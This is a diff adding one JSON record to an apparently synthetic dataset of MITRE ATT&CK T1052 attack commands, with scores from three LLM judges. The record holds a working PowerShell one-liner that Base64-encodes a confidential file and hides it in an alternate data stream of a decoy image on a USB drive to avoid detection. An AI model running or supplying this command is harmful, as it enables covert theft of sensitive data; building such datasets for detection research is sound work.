@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | Select-Object -First 1 -ExpandProperty DriveLetter); New-Item -Path \"$dl:\\Pictures\\wallpaper.jpg\" -ItemType File -Force | Out-Null; $b=[IO.File]::ReadAllBytes(\"C:\\Users\\Public\\Documents\\confidential.xlsx\"); $b64=[Convert]::ToBase64String($b); Set-Content -Path \"$dl:\\Pictures\\wallpaper.jpg\" -Stream \"thumbs\" -Value $b64",
+  "explanation": "Encodes a sensitive file as Base64 and stores it in an alternate data stream on a benign-looking file on the USB to reduce detection while exfiltrating via removable media.",
+  "rationale_steps": [
+    "Resolve the USB drive letter and ensure a cover file exists.",
+    "Read the target file and convert its bytes to Base64.",
+    "Write the encoded data into an ADS on the USB file."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-5d877001-d23851d8",
+  "source_prompt_hash": "5d877001",
+  "timestamp_utc": "2025-09-30T05:25:30.107478Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced quotes/parentheses, proper separators, and valid parameters.",
+        "semantic_score": 4,
+        "semantic_justification": "It identifies a removable drive, creates a benign file, Base64-encodes the target data, and hides it in an ADS for exfiltration, but may fail if the Pictures folder doesn't exist or the USB is not NTFS.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T10:33:44.821368Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced parentheses/braces, correct variable assignments, proper piping, and valid cmdlet usage throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1052 technique by identifying a removable drive, creating a benign-looking image file, reading a confidential file, encoding it as Base64, and hiding it in an alternate data stream of the image file for stealthy exfiltration via physical media.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T10:33:48.079408Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for Powershell cmdlets, .NET calls, variable assignments, and command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of encoding data, hiding it in an alternate data stream on a benign file on a removable drive, and aligns precisely with T1052's principles of exfiltration over physical medium with obfuscation.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T10:34:00.851570Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
